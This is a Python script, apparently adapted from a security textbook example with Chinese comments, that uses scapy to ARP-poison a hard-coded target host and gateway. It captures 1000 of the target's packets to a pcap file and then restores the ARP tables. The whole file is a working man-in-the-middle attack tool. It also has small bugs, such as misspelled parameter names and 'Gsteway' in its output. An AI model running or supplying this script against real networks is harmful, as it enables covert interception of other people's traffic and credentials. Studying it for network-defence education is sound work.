from scapy.all import *
import os,sys,threading,signal

interface = "eth0"
target_ip =  "172.20.10.3"
gateway_ip = "172.20.10.1"
packet_count = 1000

def get_mac(ip_address):
    response,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)

    for s,r in response:
        return r[Ether].src
    return None

def restore_target(gateway_ip,gatewap_mac,target_ip,target_mac):
    send(ARP(op=2,psrc=gateway_ip,pdst=target_ip,hwdst=target_mac),count = 5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwsdst=gateway_mac), count=5)

def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac  #没有设置攻击者mac，因为未设置时默认将本机mac设置为源mac


    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print("[*] Begining the ARP poison . [CTRL-C to stop]")

    while True:
        try:
            send(poison_target)
            send(poison_gateway)

            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip,gateway_mac,target_ip,target_mac)

    print("[*] ARP poison attack finished")
    return


#设置嗅探的网卡
conf.iface = interface

#关闭输出
conf.verb = 0

print("[*] Setting up %s" % interface)

gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print("[*] Failed to get gateway MAC -> Exiting")
    sys.exit()
else:
    print("[*] Gsteway %s is at %s" % (gateway_ip,gateway_mac))

target_mac = get_mac(target_ip)

if target_mac is None:
    print("[*] Failed to get target MAC -> Exiting")
    sys.exit()
else:
    print("[*] Gsteway %s is at %s" % (target_ip,target_mac))

#启动arp投毒线程
poison_thread = threading.Thread(target=poison_target,args=(gateway_ip,gateway_mac,target_ip,target_mac))
poison_thread.start()

try:
    print("[*] Starting sniffer for %d packets" % packet_count)

    bpf_filter = "ip host %s" % target_ip

    packets = sniff(count=packet_count,filter=bpf_filter,iface=interface)

    #输出到pcap文件中
    wrpcap('arper.pcap',packets)

    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)

except KeyboardInterrupt:
    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
    sys.exit()


